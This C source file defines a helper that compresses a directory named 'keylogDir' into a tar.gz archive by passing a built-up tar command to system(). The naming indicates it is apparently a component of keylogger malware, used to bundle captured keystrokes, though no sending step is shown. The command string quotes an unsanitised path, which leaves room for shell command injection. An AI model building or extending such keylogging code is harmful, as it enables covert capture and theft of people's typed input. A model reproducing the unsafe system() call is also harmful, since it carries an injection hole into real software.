#include "compress.h"

char *compressFile(const char *keylogDir)
{
    static char tarPath[512];
    snprintf(tarPath, sizeof(tarPath), "%s.tar.gz", keylogDir);

    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "tar -czf '%s' -C '%s' . >/dev/null 2>&1", tarPath, keylogDir);
    system(cmd);

    return tarPath;
}